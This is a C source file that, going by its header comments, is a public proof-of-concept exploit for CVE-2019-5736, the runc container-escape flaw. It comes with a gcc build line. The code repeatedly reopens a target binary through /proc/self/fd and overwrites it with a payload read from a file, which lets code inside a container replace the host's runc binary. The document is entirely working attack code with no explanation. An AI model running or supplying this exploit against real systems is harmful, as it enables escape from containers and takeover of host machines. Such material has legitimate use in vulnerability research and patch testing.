// From https://github.com/feexd/pocs/blob/master/CVE-2019-5736/exploit.c
// gcc -O2 -Wno-unused-result CVE-2019-5736.c -o CVE-2019-5736.x64.bin

#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>

#define PAYLOAD_MAX_SIZE 1048576
#define O_PATH 010000000
#define SELF_FD_FMT "/proc/self/fd/%d"

int main(int argc, char **argv) {
    int fd;
	char *payload, dest[512];

    payload = malloc(PAYLOAD_MAX_SIZE);
    if (payload == NULL) return 2;

    FILE *f = fopen(argv[2], "r");
    if (f == NULL) return 3;
    int payload_sz = fread(payload, 1, PAYLOAD_MAX_SIZE, f);

    for (;;) {
        fd = open(argv[1], O_PATH);
        if (fd >= 0) {
            snprintf(dest, 500, SELF_FD_FMT, fd);
            for (int i = 0; i < 9999999; i++) {
                fd = open(dest, O_WRONLY | O_TRUNC);
                if (fd >= 0) {
                    write(fd, payload, payload_sz);
                    break;
                }
            }
            break;
        }
    }
    return 0;
}
